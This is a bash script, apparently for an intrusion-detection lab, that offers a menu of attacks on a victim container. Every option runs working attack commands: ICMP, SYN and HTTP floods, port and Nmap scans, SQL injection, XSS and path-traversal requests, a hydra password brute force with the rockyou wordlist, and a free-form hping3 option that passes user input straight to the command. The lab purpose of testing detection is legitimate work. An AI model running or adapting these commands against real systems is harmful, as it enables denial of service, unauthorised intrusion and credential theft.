#!/bin/bash

# Attack Scripts for IDS Lab Testing
# Target: victim container (172.20.0.20)

VICTIM_IP="172.20.0.20"
VICTIM_WEB="http://172.20.0.20"

echo "=== IDS Lab Attack Menu ==="
echo "Target: $VICTIM_IP"
echo ""
echo "1. ICMP Flood"
echo "2. TCP SYN Flood"
echo "3. HTTP Flood"
echo "4. Port Scan"
echo "5. Nmap Scan"
echo "6. Web Application Attacks"
echo "7. Brute Force Attack"
echo "8. All Attacks (Sequential)"
echo "9. Custom Attack"
echo "0. Exit"
echo ""

read -p "Select attack type (0-9): " choice

case $choice in
    1)
        echo "Starting ICMP Flood..."
        hping3 -1 --flood $VICTIM_IP
        ;;
    2)
        echo "Starting TCP SYN Flood on port 80..."
        hping3 -S -p 80 --flood $VICTIM_IP
        ;;
    3)
        echo "Starting HTTP Flood..."
        for i in {1..100}; do
            curl -s $VICTIM_WEB > /dev/null &
        done
        wait
        ;;
    4)
        echo "Starting Port Scan..."
        hping3 -S -p ++1-1000 $VICTIM_IP
        ;;
    5)
        echo "Starting Nmap Scan..."
        nmap -sS -O $VICTIM_IP
        ;;
    6)
        echo "Starting Web Application Attacks..."
        # SQL Injection
        curl "$VICTIM_WEB/vulnerabilities/sqli/?id=1' UNION SELECT 1,2,3--&Submit=Submit"
        # XSS
        curl "$VICTIM_WEB/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"
        # Directory Traversal
        curl "$VICTIM_WEB/../../../etc/passwd"
        ;;
    7)
        echo "Starting Brute Force Attack..."
        hydra -l admin -P /usr/share/wordlists/rockyou.txt $VICTIM_IP http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
        ;;
    8)
        echo "Running all attacks sequentially..."
        /scripts/icmp_flood.sh &
        sleep 10
        /scripts/syn_flood.sh &
        sleep 10
        /scripts/http_flood.sh &
        sleep 10
        /scripts/port_scan.sh &
        sleep 10
        /scripts/web_attacks.sh
        ;;
    9)
        echo "Enter custom hping3 command:"
        read -p "hping3 " custom_cmd
        hping3 $custom_cmd
        ;;
    0)
        echo "Exiting..."
        exit 0
        ;;
    *)
        echo "Invalid choice!"
        ;;
esac
